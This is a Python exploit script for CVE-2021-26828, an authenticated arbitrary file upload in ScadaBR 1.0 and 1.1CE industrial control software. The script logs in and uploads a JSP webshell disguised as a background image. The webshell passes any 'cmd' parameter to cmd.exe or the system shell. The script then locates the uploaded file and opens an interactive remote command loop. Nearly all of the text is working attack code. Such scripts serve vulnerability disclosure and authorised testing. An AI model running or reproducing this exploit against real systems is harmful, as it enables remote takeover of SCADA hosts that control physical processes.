#!/usr/bin/python

# Exploit Title: Authenticated Arbitrary File Upload (Remote Code Execution)
# Google Dork: N/A
# Date: 04/21
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://www.scadabr.com.br/ 
# Software Link: https://www.scadabr.com.br/ 
# Version: ScadaBR 1.0, ScadaBR 1.1CE and ScadaBR 1.0 for Linux
# Tested on: Windows7, Windows10
# CVE : CVE-2021-26828

import requests
import sys
import time

if len(sys.argv) <= 4:
    print('[x] Missing arguments ... ')
    print('[>] Usage: python WinScada_RCE.py <TargetIp> <TargetPort> <User> <Password>')
    print('[>] Example: python WinScada_RCE.py 192.168.1.24 8080 admin admin')
    sys.exit(0)
else:    
    time.sleep(1)

host = sys.argv[1]
port = sys.argv[2]
user = sys.argv[3]
passw = sys.argv[4]

flag = False
LOGIN = 'http://' + host + ':' + port + '/ScadaBR/login.htm'
PROTECTED_PAGE = 'http://' + host + ':' + port + '/ScadaBR/view_edit.shtm'

banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|    _________                  .___     ____________________       |
|   /   _____/ ____ _____     __| _/____ \______   \______   \      |
|   \_____  \_/ ___\\__  \   / __ |\__  \ |    |  _/|       _/       |
|   /        \  \___ / __ \_/ /_/ | / __ \|    |   \|    |   \      |
|  /_______  /\___  >____  /\____ |(____  /______  /|____|_  /      |
|          \/     \/     \/      \/     \/       \/        \/       |
|                                                                   |
|    > ScadaBR 1.0 ~ 1.1 CE Arbitrary File Upload (CVE-2021-26828)  |
|    > Exploit Author : Fellipe Oliveira                            |
|    > Exploit for Windows Systems                                  |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

def main():
    payload = {
        'username': user,
        'password': passw
    }

    print(banner)
    time.sleep(2)

    with requests.session() as s:
        s.post(LOGIN, data=payload)
        response = s.get(PROTECTED_PAGE)

        print("[+] Trying to authenticate " + LOGIN + "...")
        if response.status_code == 200:
            print("[+] Successfully authenticated! :D~\n")
            time.sleep(2)
        else:
            print("[x] Authentication failed :(")
            sys.exit(0)

        burp0_url = "http://" + host + ":" + port + "/ScadaBR/view_edit.shtm"
        burp0_cookies = {"JSESSIONID": "66E47DFC053393AFF6C2D5A7C15A9439"}
        burp0_headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------6150838712847095098536245849",
            "Origin": "http://" + host + ":" + port + "/",
            "Connection": "close",
            "Referer": "http://" + host + ":" + port + "/ScadaBR/view_edit.shtm",
            "Upgrade-Insecure-Requests": "1"
        }
        burp0_data = "-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"view.name\"\r\n\r\n\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"view.xid\"\r\n\r\nGV_218627\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"backgroundImageMP\"; filename=\"win_cmd.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page import=\"java.util.*,java.io.*\"%>\n<%\n%>\n<HTML><BODY>\nCommands with JSP\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\n<INPUT TYPE=\"text\" NAME=\"cmd\">\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\n</FORM>\n<pre>\n<%\nif (request.getParameter(\"cmd\") != null) {\n    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\n    Process p;\n    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\n    }\n    else{\n        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n    }\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n    out.println(disr);\n    disr = dis.readLine();\n    }\n}\n%>\n</pre>\n</BODY></HTML>\n\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nUpload image\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"view.anonymousAccess\"\r\n\r\n0\r\n-----------------------------6150838712847095098536245849--\r\n"
        getdata = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

        print('[>] Attempting to upload .jsp Webshell...')
        time.sleep(1)
        print('[>] Verifying shell upload...\n')
        time.sleep(2)

        if getdata.status_code == 200:
            print('[+] Upload Successfuly!')

            for num in range(1, 500):
                PATH = 'http://' + host + ':' + port + '/ScadaBR/uploads/%d.jsp' % (num)
                find = s.get(PATH)

                if find.status_code == 200:
                    print('[+] Webshell Found in: http://' + host + ':' + port + '/ScadaBR/uploads/%d.jsp' % (num))
                    flag = True
                    print('[>] Spawning fake shell...')
                    time.sleep(3)

                    while flag:
                        param = input("# ")
                        burp0_url = "http://" + host + ":" + port + "/ScadaBR/uploads/%d.jsp?cmd=%s" % (num, param)
                        burp0_cookies = {"JSESSIONID": "4FCC12402B8389A64905F4C8272A64B5"}
                        burp0_headers = {
                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip, deflate",
                            "Connection": "close",
                            "Referer": "http://" + host + ":" + port + "/ScadaBR/uploads/%d.jsp?cmd=%s",
                            "Upgrade-Insecure-Requests": "1"
                        }
                        send = s.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
                        clean = send.text.replace('<pre>', '').replace('<FORM METHOD=', '').replace('<HTML><BODY>', '').replace('"GET" NAME="myform" ACTION="">', '').replace('Commands with JSP', '').replace('<INPUT TYPE="text" NAME="cmd">', '').replace('<INPUT TYPE="submit" VALUE="Send">', '').replace('</FORM>', '').replace('<BR>', '').replace('</pre>', '').replace('</BODY></HTML>', '')
                        print(clean)

                elif num == 499:
                    print('[x] Webshell not Found')

        else:
            print('Reason:' + getdata.reason + ' ')
            print('Exploit Failed x_x')

if __name__ == '__main__':
    main()
